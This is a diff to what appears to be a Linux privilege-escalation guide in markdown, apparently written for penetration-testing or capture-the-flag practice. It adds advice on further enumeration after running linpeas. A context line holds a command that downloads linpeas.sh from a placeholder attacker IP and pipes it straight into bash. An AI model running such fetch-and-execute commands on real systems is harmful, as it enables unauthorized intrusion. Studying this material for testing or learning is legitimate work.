@@ -22,3 +22,15 @@ Linpeas is a bit outdated but is still effective at finding attack vectors.
 `curl -sL http://<myip>/linpeas.sh | bash`
 
 It is important to carefully read over the output, even the output that linpeas doesn't highlight red.
+
+### Furthur Enumeration
+
+If the `one-liners` **AND** `linpeas` didn't find anything useful, the answer is probably very simple. You most likely just need to like into the files you have read access too. This includes things like:
+
+- Web config files and source code.
+- Files in your users home directory.
+- Application version exploit *OR* Linux kernel exploit.
+
+If none of the above worked or showed anything interesting, restart from the top, you probably missed something.
+
+## Obtaining Root
